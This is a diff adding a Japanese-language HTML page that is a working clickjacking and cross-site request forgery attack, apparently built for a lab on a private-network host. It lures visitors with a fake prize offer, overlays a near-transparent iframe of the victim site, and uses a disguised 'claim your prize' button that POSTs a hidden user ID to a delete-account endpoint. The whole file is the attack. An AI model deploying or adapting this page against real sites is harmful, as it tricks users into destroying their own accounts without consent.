@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>特別オファー！</title>
+  <style>
+    /* iframeを透明にして、被害者のページを見えなくする */
+    iframe {
+      position: absolute;
+      top: -25px;
+      left: 30px;
+      opacity: 0.1;
+      width: 400px;
+      height: 200px;
+      z-index: 1;
+    }
+
+    /* 偽のボタンをiframeと同じ位置に設定 */
+    #fakeButton {
+      position: absolute;
+      top: 1px;
+      left: 30px;
+      width: 400px;
+      height: 200px;
+      background-color: #28a745;
+      color: white;
+      font-size: 20px;
+      text-align: center;
+      line-height: 200px;
+      cursor: pointer;
+      z-index: 2;
+    }
+  </style>
+</head>
+<body>
+  <h1>おめでとうございます！賞品を受け取るにはクリック！</h1>
+
+<iframe src="http://192.168.7.246/index.html"></iframe>
+
+
+  <!-- 偽のボタン（実際にはフォーム） -->
+ 
+ <form action="http://192.168.7.246:3000/delete-account" method="POST">
+    <input type="hidden" name="userId" value="1">
+    <button type="submit">ここをクリックして賞品を獲得！</button>
+  </form>
+
+</body>
+</html>
